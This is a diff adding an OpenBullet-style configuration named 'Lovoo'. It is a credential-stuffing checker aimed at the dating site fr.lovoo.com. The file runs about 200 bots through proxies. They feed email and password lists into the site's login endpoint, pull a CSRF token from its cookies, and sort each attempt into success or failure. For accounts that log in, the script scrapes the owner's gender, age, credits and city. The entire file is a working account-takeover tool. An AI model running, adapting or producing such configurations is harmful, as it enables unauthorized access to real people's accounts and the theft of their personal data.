@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Lovoo",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-19T01:08:13.7871302+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.6.1 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://fr.lovoo.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(__cfduid)>" LR "" "" -> VAR "TOKEN1" 
+
+PARSE "<COOKIES(lovoocsrf)>" LR "" "" -> VAR "TOKEN2" 
+
+REQUEST POST "https://fr.lovoo.com/login_check" 
+  CONTENT "_username=<USER>&_password=<PASS>&_remember_me=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://fr.lovoo.com" 
+  HEADER "public: true" 
+  HEADER "referer: https://fr.lovoo.com/" 
+  HEADER "x-csrf-token: <TOKEN2>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true,\"" 
+
+REQUEST GET "https://fr.lovoo.com/discover/people" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#sex PARSE "<SOURCE>" LR "\",\"gender\":" ",\"" -> CAP "GENRE" "" "( 1=H 2=F )" 
+
+#Age PARSE "<SOURCE>" LR ",\"age\":" ",\"l" -> CAP "Age" 
+
+#Credit PARSE "<SOURCE>" LR "\"credits\":" ",\"" -> CAP "Credit" 
+
+#Ville PARSE "<SOURCE>" LR "{\"city\":\"" "\",\"" -> CAP "Ville" 
+
